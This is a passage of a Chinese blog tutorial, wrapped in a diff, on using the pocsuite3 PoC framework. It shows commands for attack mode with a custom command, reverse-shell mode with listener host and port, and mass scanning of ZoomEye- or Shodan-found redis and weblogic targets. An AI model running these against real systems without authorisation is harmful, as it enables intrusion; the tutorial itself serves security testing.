@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>pocsuite简单学习 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="简介 读读英文&hellip; pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuite有两种交互模式： 一个是命令" /><meta name="keywords" content='开源渗透框架, pocsuite' /><meta itemprop="name" content="pocsuite简单学习">
+<meta itemprop="description" content="简介 读读英文&hellip; pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuite有两种交互模式： 一个是命令"><meta itemprop="datePublished" content="2021-01-11T16:33:20+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="4184"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="开源渗透框架,pocsuite," /><meta property="og:title" content="pocsuite简单学习" />
+<meta property="og:description" content="简介 读读英文&hellip; pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuite有两种交互模式： 一个是命令" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-11T16:33:20+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="pocsuite简单学习"/>
+<meta name="twitter:description" content="简介 读读英文&hellip; pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuite有两种交互模式： 一个是命令"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://geoer.cn/web%E5%AE%89%E5%85%A8%E7%AE%80%E8%A6%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" /><link rel="next" href="https://geoer.cn/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "pocsuite简单学习",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "开源渗透框架, pocsuite","wordcount":  4184 ,
+    "url": "https:\/\/geoer.cn\/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0\/","datePublished": "2021-01-11T16:33:20+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>pocsuite简单学习</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2021-01-11&#32;16:33:20><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-01-11">2021-01-11</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 4184 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 9 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="pocsuite简单学习">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#安装">安装</a></li>
+        <li><a href="#基本使用">基本使用</a>
+          <ul>
+            <li><a href="#命令行模式下常用命令"><strong>命令行模式下</strong>常用命令：</a></li>
+            <li><a href="#verify和attack两种poc模式">verify和attack两种POC模式</a></li>
+            <li><a href="#一些模块接口">一些模块接口</a></li>
+            <li><a href="#optimization-其他选项">Optimization 其他选项</a></li>
+            <li><a href="#console模式">console模式</a></li>
+            <li><a href="#其他参数">其他参数</a></li>
+          </ul>
+        </li>
+        <li><a href="#编写poc插件">编写POC插件</a>
+          <ul>
+            <li><a href="#poc注意事项">POC注意事项</a></li>
+            <li><a href="#举例">举例</a></li>
+            <li><a href="#command外部参数传递"><code>command</code>外部参数传递。</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h3 id="简介">简介</h3>
+<blockquote>
+<p>读读英文&hellip;</p>
+</blockquote>
+<p>pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the <a href="http://www.knownsec.com/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Knownsec 404 Team</strong><i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers</p>
+<p><strong>Pocsuite有两种交互模式：</strong></p>
+<ul>
+<li>一个是命令行模式类似我们所知的sqlmap的界面</li>
+<li>另一个是控制台交互模式类似w3af或者matasploit的界面。</li>
+</ul>
+<h3 id="安装">安装</h3>
+<p>github地址：https://github.com/knownsec/Pocsuite3</p>
+<p>也可通过pip安装：<code>pip install pocsuite3</code></p>
+<p>安装完成后测试是否安装成功：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -h		<span class="c1"># pip安装的情况</span>
+</span></span><span class="line"><span class="cl">python cli.py -h	<span class="c1"># 适用于下载并解压zip压缩包的情况</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="基本使用">基本使用</h3>
+<h4 id="命令行模式下常用命令"><strong>命令行模式下</strong>常用命令：</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -u http://example.com -r example.py -v <span class="m">2</span> <span class="c1"># 基础用法 v2开启详细信息</span>
+</span></span><span class="line"><span class="cl">pocsuite -u http://example.com -r example.py -v <span class="m">2</span> --shell <span class="c1"># shell反连模式，基础用法 v2开启详细信息</span>
+</span></span><span class="line"><span class="cl">pocsuite -r redis.py --dork service:redis --threads <span class="m">20</span> <span class="c1"># 从zoomeye搜索redis目标批量检测，线程设置为20</span>
+</span></span><span class="line"><span class="cl">pocsuite -u http://example.com --plugins poc_from_pocs,html_report <span class="c1"># 加载poc目录下所有poc,并将结果保存为html</span>
+</span></span><span class="line"><span class="cl">pocsuite -f batch.txt --plugins poc_from_pocs,html_report <span class="c1"># 从文件中加载目标，并使用poc目录下poc批量扫描</span>
+</span></span><span class="line"><span class="cl">pocsuite -u 10.0.0.0/24 -r example.py --plugins target_from_cidr <span class="c1"># 加载CIDR目标</span>
+</span></span><span class="line"><span class="cl">pocsuite -u http://example.com -r ecshop_rce.py --attack --command <span class="s2">&#34;whoami&#34;</span> <span class="c1"># ecshop poc中实现了自定义命令</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="verify和attack两种poc模式">verify和attack两种POC模式</h4>
+<p>在使用Pocsuite的时候，我们可以用&ndash;verify参数来调用_verify方法，用&ndash;attack参数来调用_attack方法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># POC内部方法如下</span>
+</span></span><span class="line"><span class="cl">def _attack<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="nv">result</span> <span class="o">=</span> <span class="o">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#Write your code here</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> self.parse_output<span class="o">(</span>result<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def _verify<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="nv">result</span> <span class="o">=</span> <span class="o">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#Write your code here</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> self.parse_output<span class="o">(</span>result<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>verify 模式：验证目标是否存在漏洞:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#  -r POC 加载POCfile 或者 remote from seebug websit</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  -u URL</span>
+</span></span><span class="line"><span class="cl">pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>attack 模式：向目标发起有效的攻击:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>批量验证，将url写到一个txt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -f url_file（多个url）</span>
+</span></span><span class="line"><span class="cl">pocsuite -r test/poc_example.py -f url.txt --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>加载 tests 目录下的所有 PoC 对目标进行测试（可以充当扫描器角色）:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -r tests/ -u http://www.example.com --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用多线程，默认线程数为1:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -r test/ -f url.txt --verify --threads <span class="m">10</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用shell交互模式，对目标进行远程控制：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -u http://example.com -r example.py -v <span class="m">2</span> --shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从seebug下载poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -c configfile 加载选项from a configuration INI file</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果是压缩包解压zip源码的方式，运行脚本方式如下，切换到pocsuite3目录，运行<code>cli.py</code>文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python cli.py -u x.x.x.x -r example.py --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="一些模块接口">一些模块接口</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">--dork <span class="o">(</span>默认为zoomeye搜索搜索引擎<span class="o">)</span>
+</span></span><span class="line"><span class="cl">--dork-zoomeye 搜过关键字
+</span></span><span class="line"><span class="cl">--dork-shodan 搜索关键字
+</span></span><span class="line"><span class="cl">--dork-censys 搜索关键字
+</span></span><span class="line"><span class="cl">--max-page 多少页
+</span></span><span class="line"><span class="cl">--search-type  搜索类型选择API,Web or Host
+</span></span><span class="line"><span class="cl">--vul-keyword seebug关键词搜索
+</span></span><span class="line"><span class="cl">--ssv-id seebug漏洞编号
+</span></span><span class="line"><span class="cl">--lhost shell模式反弹主机
+</span></span><span class="line"><span class="cl">--lport shell模式反弹端口
+</span></span><span class="line"><span class="cl">--comparison 比较两个搜索引擎
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1"># eg:从ZoomEye中调用host批量验证某个POC：</span>
+</span></span><span class="line"><span class="cl">pocsuite -r weblogic_CVE-2017-10271.py --dork <span class="s1">&#39;weblogic&#39;</span> --max-page <span class="m">5</span> --thread <span class="m">20</span> --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="optimization-其他选项">Optimization 其他选项</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">--plugins 加载插件
+</span></span><span class="line"><span class="cl">--pocs-path     poc地址
+</span></span><span class="line"><span class="cl">--threads      开启线程      
+</span></span><span class="line"><span class="cl">--batch      自动默认选项
+</span></span><span class="line"><span class="cl">--requires      检测需要安装的模块
+</span></span><span class="line"><span class="cl">--quiet     没有logger
+</span></span><span class="line"><span class="cl">--ppt   隐藏敏感信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="console模式">console模式</h4>
+<p><code>poc-console</code>进入console模式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Global commands:
+</span></span><span class="line"><span class="cl">        <span class="nb">help</span>  帮助
+</span></span><span class="line"><span class="cl">        use &lt;module&gt;  使用模块
+</span></span><span class="line"><span class="cl">        search &lt;search term&gt; 搜索模块
+</span></span><span class="line"><span class="cl">        list<span class="p">|</span>show all   显示所有模块
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> 退出
+</span></span><span class="line"><span class="cl">  Module commands:
+</span></span><span class="line"><span class="cl">        run  使用设置的参数运行选中的脚本
+</span></span><span class="line"><span class="cl">        back 返回上一步
+</span></span><span class="line"><span class="cl">        <span class="nb">set</span> 参数名 参数值<span class="o">(</span>当前模块<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        setg 参数名 参数值<span class="o">(</span>所有模块<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        show info<span class="p">|</span>options<span class="p">|</span>all 打印information,options
+</span></span><span class="line"><span class="cl">        check 使用--verify模式
+</span></span><span class="line"><span class="cl">        attack 使用--attack模式
+</span></span><span class="line"><span class="cl">        exploit 使用--shell模式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="其他参数">其他参数</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
